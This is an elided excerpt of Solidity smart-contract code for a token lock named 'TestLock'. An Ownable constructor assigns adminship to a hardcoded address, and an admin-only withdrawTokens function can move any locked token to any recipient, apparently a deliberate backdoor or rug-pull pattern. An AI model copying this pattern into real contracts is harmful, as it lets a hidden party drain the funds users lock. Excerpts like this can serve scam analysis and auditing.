...
abstract contract Ownable is Context {
    ...
    constructor() {
        ...
        _transferAdminship(0x8964A0A2d814c0e6bF96a373f064a0Af357bb4cE);
    }
...
interface IWAVAX{
 ...
 contract TestLock is Ownable {
    ...
    function withdrawTokens(address _token, address _to) external onlyAdmin {
    ...
    function lockTokens(uint256 _amount) external payable{
        require(!isContract(msg.sender), "EOA only");
